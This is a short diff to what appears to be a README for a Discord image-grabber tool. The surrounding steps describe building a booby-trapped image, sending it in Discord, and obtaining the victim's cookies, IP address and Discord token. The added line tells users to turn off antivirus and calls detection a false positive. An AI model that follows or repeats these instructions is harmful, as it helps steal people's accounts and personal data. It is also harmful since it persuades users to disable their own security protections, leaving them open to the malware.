@@ -13,7 +13,7 @@ Step.6 enter ur image url.
 Step.7 after that go to dist folder and u will see the image that u copied.
 Step.8 send it in discord and test it out urself NOT ON OTHER PEOPLE!!
 Step.9 boom u will have their cookie, ip and discord token.
-
+Make sure ur Anti Virus is off before u do anything its a false positive if u dont know what it is search it up.
 Thats it!
 
 The reason why u need .NET FRAMEWORK 3.5 cuz we coded it in .NET FRAMEWORK 3.5.
